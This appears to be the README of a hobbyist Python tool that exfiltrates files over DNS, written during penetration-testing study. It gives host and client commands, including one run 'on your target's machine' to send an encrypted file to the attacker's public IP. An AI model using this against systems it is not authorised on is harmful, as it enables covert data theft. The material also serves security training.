# A lightweight, easy-to-use, DNS data exfiltrator
As I was plowing through the INE eJPT course, I ran into a DNS data exfiltrator that I thought was annoying to use. So I rolled my own. This is the result. I am open to suggestions, critique and questions. I learned a lot from building this, both about the DNS protocol and how data exfiltration works and some neat tricks in Python. I hope it'll benefit you in your (legal!) endeavors.

## Installation
Just clone/download the script from this Git repo and run the script as instructed below.

## Dependencies / Requirements
* Python 3.8+
* PyCryptodome: `pip3 install pycryptodome`

## Usage
The script can be run in two modes: host or client. The host mode should be used on your own machine, where the data is being exfiltrated to. The client mode should be run on your target's machine, where the data is being exfiltrated from. 

## Data encryption
The data that is being exfiltrated is encrypted using AES256 symmetric encryption. It is therefore important that you set the same seed phrase or password on both the host and client.

### Host
Running the script in host mode will run a mock DNS server on udp/53 (by default, you can change the port if you want to) which is built specifically to receive exfiltrated data from the script in client mode and respond accordingly with a standard DNS reponse. For example:
```
python3 main.py -mode host -hostip "127.0.0.1" -password "s3cr3tp4ssw0rd"
```

### Client
On your target machine, copy-paste / install the script and run it. For example:
```
python3 main.py -mode client -dest "your_public_machine_ip" -password "s3cr3tp4ssw0rd" -file "/path/to/the/file/you/want/to/exfil"
```

### More help
```
python3 main.py -h
```

## Notes on data transfer
The way this script works is by reading, and encrypting, the to-be-exfiltrated file. The encrypted file contents is then split up into packets of 32 bytes (by default) as DNS queries cannot be greater than 63 octets. The encrypted packets are then sent to the host as the queried FQDN. The host will then receive the DNS query with the encrypted packet, respond with a valid DNS response, paste the packets back together to form the file and decrypt its contents. Et voila, an exfiltrated file.
